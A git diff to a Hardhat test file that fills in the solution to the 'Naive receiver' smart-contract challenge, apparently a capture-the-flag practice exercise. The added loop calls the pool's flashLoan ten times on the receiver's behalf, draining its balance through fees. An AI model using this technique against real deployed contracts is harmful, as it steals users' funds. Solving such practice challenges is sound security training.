@@ -30,7 +30,11 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        // an attacker can call the `flashLoan` function with the receiver address multiple times
+        // in order to drain all the funds in the receiver (paid as fees to the loaner)
+        for(i = 0; i < 10; i++) {
+            await this.pool.connect(attacker).flashLoan(this.receiver.address, 1);
+        }
     });
 
     after(async function () {
